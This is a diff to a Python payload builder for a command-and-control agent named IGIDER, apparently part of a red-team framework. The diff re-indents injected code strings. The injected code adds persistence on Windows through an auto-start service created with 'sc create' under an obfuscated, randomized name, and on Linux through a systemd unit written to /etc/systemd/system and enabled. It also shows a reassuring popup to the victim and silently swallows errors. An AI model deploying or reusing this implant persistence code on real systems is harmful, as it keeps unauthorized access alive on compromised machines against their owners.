@@ -394,94 +394,94 @@ class Igider(PayloadType):
                     command_code += self._load_module_content(command_path) + "\n"
 
             command_code += (r"""
-                import tkinter 
-                def show_console_popup(self, duration=5000):
-                    msg = (
-                        "IGIDER Agent is now running in the background.\n"
-                        "Monitoring system vulnerabilities and testing in progress.\n"
-                        "You can safely continue your work."
-                    )
+    import tkinter 
+    def show_console_popup(self, duration=5000):
+        msg = (
+            "IGIDER Agent is now running in the background.\n"
+            "Monitoring system vulnerabilities and testing in progress.\n"
+            "You can safely continue your work."
+        )
 
-                    root = tkinter.Tk()
-                    root.overrideredirect(True)          
-                    root.attributes("-topmost", True)   
-                    root.configure(bg="#0f0f1f")        
+        root = tkinter.Tk()
+        root.overrideredirect(True)          
+        root.attributes("-topmost", True)   
+        root.configure(bg="#0f0f1f")        
 
-                    width, height = 450, 150
-                    x = (root.winfo_screenwidth() - width) // 2
-                    y = (root.winfo_screenheight() - height) // 2
-                    root.geometry(f"{width}x{height}+{x}+{y}")
+        width, height = 450, 150
+        x = (root.winfo_screenwidth() - width) // 2
+        y = (root.winfo_screenheight() - height) // 2
+        root.geometry(f"{width}x{height}+{x}+{y}")
 
-                    frame = tkinter.Frame(root, bg="#0f0f1f", bd=3, relief="ridge")
-                    frame.pack(fill="both", expand=True)
+        frame = tkinter.Frame(root, bg="#0f0f1f", bd=3, relief="ridge")
+        frame.pack(fill="both", expand=True)
 
-                    label = tkinter.Label(
-                        frame,
-                        text=msg,
-                        font=("Consolas", 12, "bold"),
-                        fg="#00ff99",              
-                        bg="#0f0f1f",
-                        justify="center",
-                        wraplength=400
-                    )
-                    label.pack(expand=True, padx=20, pady=20)
-                    root.after(duration, root.destroy)
-                    root.mainloop()
+        label = tkinter.Label(
+            frame,
+            text=msg,
+            font=("Consolas", 12, "bold"),
+            fg="#00ff99",              
+            bg="#0f0f1f",
+            justify="center",
+            wraplength=400
+        )
+        label.pack(expand=True, padx=20, pady=20)
+        root.after(duration, root.destroy)
+        root.mainloop()
 
                                 """)
             if selected_os == "windows":
                 command_code +=(r"""
-                def create_persistence(self):
-                    try:
-                        svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))  # Randomized name
-                        try:
-                            subprocess.check_output(f"sc query {svc_name}", shell=True)
-                            return  
-                        except subprocess.CalledProcessError:
-                            pass  
-                        
-                        cmd = f'sc create {svc_name} binpath= "{sys.executable} {__file__}" start= auto'
-                        subprocess.check_output(cmd, shell=True)
-                        subprocess.check_output(f'sc start {svc_name}', shell=True)
-                    except Exception as e:
-                        pass
+    def create_persistence(self):
+        try:
+            svc_name = dec(b'<base64_encoded_obf_svc_name>') + str(random.randint(1000, 9999))  # Randomized name
+            try:
+                subprocess.check_output(f"sc query {svc_name}", shell=True)
+                return  
+            except subprocess.CalledProcessError:
+                pass  
+            
+            cmd = f'sc create {svc_name} binpath= "{sys.executable} {__file__}" start= auto'
+            subprocess.check_output(cmd, shell=True)
+            subprocess.check_output(f'sc start {svc_name}', shell=True)
+        except Exception as e:
+            pass
 
                                 """)
             else:
                 command_code += f"""
-                import os, random, subprocess, sys
+    import os, random, subprocess, sys
 
-                def create_persistence_linux(self):
-                    try:
-                        svc_name = "svc" + str(random.randint(1000, 9999))  # randomized service name
-                        service_file = f"/etc/systemd/system/{{svc_name}}.service"
+    def create_persistence_linux(self):
+        try:
+            svc_name = "svc" + str(random.randint(1000, 9999))  # randomized service name
+            service_file = f"/etc/systemd/system/{{svc_name}}.service"
 
-                        # Check if service already exists
-                        if os.path.exists(service_file):
-                            return  
+            # Check if service already exists
+            if os.path.exists(service_file):
+                return  
 
-                        # Create systemd service content
-                        service_content = f\"\"\"[Unit]
-                Description=Persistence Service {{svc_name}}
+            # Create systemd service content
+            service_content = f\"\"\"[Unit]
+    Description=Persistence Service {{svc_name}}
 
-                [Service]
-                ExecStart={{sys.executable}} {{os.path.abspath(__file__)}}
-                Restart=always
+    [Service]
+    ExecStart={{sys.executable}} {{os.path.abspath(__file__)}}
+    Restart=always
 
-                [Install]
-                WantedBy=multi-user.target
-                \"\"\"
+    [Install]
+    WantedBy=multi-user.target
+    \"\"\"
 
-                        # Write service file
-                        with open(service_file, "w") as f:
-                            f.write(service_content)
+            # Write service file
+            with open(service_file, "w") as f:
+                f.write(service_content)
 
-                        # Enable and start service
-                        subprocess.run(["systemctl", "enable", svc_name], check=False)
-                        subprocess.run(["systemctl", "start", svc_name], check=False)
+            # Enable and start service
+            subprocess.run(["systemctl", "enable", svc_name], check=False)
+            subprocess.run(["systemctl", "start", svc_name], check=False)
 
-                    except Exception:
-                        pass
+        except Exception:
+            pass
                 """
 
 
